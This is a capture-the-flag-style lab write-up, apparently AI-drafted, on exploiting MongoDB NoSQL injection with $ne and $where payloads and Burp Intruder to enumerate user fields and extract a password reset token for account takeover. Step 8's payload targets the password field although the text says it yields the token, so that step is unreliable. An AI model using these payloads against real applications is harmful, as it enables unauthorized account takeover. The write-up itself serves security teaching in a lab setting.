# 🧪 Field Enumeration to Full Account Takeover with NoSQL Injection

## Exploited a NoSQL injection flaw to enumerate hidden fields and extract a valid password reset token, leading to a seamless account takeover.

Certainly! Here's your complete write-up with your exact point numbering style, plus Intro, Disclaimer, and a friendly Goodbye note:

---

## 📘 Introduction

This lab demonstrates a NoSQL injection vulnerability in a MongoDB-backed login system. By abusing MongoDB operators like `$ne` and `$where`, we can bypass authentication checks, enumerate hidden user fields, and finally extract a password reset token to hijack an account. This step-by-step PoC reveals how NoSQL injections can lead to full account compromise when input validation and query construction are insufficiently secured.

---

## ⚠️ Disclaimer

This material is provided solely for educational purposes on authorized lab environments. Unauthorized testing or exploitation of systems without explicit permission is illegal and unethical. Always practice responsible disclosure and adhere to applicable laws.

---

## 🧩 Step-by-Step PoC

1. Access the Lab, try to sign in with username `carlos` and any random password, intercept the request with Burp Suite.

2. Send the intercepted POST `/login` request to Repeater with body:

   ```json
   {
     "username": "carlos",
     "password": "test"
   }
   ```

   Response:

   ```
   Invalid username or password
   ```

3. Try bypass using the MongoDB not equal operator `$ne`:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" }
   }
   ```

   Response:

   ```
   Account locked: please reset your password
   ```

   Although the login is not bypassed, the `$ne` operator is accepted, confirming injection.

4. Add the `$where` parameter as `0` (false):

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "0"
   }
   ```

   Response:

   ```
   Invalid username or password
   ```

5. Change `$where` to `1` (true):

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "1"
   }
   ```

   Response:

   ```
   Account locked: please reset your password
   ```

   This proves the `$where` clause is evaluated and injectable.

6. Enumerate user document fields with Intruder. Use the payload:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "Object.keys(this)[§§].match('^.{}.*')"
   }
   ```

   Attack setup:

   * Attack type: Cluster Bomb
   * Payload position 1 (§§): Numbers, from 0 to 20
   * Payload position 2 (§§): Brute force characters: `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789` (min/max length 1)

   Interpretation:

   * Index 0: `_id` (default)
   * Index 1: `username`
   * Index 2: `password`

   By incrementing the index, you discover all user fields, including a password reset token.

7. Capture the `GET /forgot-password` request in Proxy. This endpoint is related to password reset.

8. Use Intruder with payload to extract token value:

   ```json
   {
     "username": "carlos",
     "password": { "$ne": "invalid" },
     "$where": "this.password.match('^.{}.*')"
   }
   ```

   Extracted token (example):

   ```
   zw81ejagwjes6l1wgpn
   ```

9. Use the extracted token as a GET parameter in the forgot-password URL:

   ```
   /forgot-password?resetToken=zw81ejagwjes6l1wgpn
   ```

   You can now reset Carlos’s password and log in, solving the lab.

---

## 👋 Happy Hacking Goodbye Note

Congratulations on mastering this NoSQL injection challenge! Remember, the same techniques that let you exploit vulnerable apps can be used to defend them. Always hack ethically, report responsibly, and keep learning.

Happy hacking and stay curious!
— Aditya Bhatt ☠️🛡️

---

If you'd like, I can help format this for a blog post or create a concise summary for quick reference!
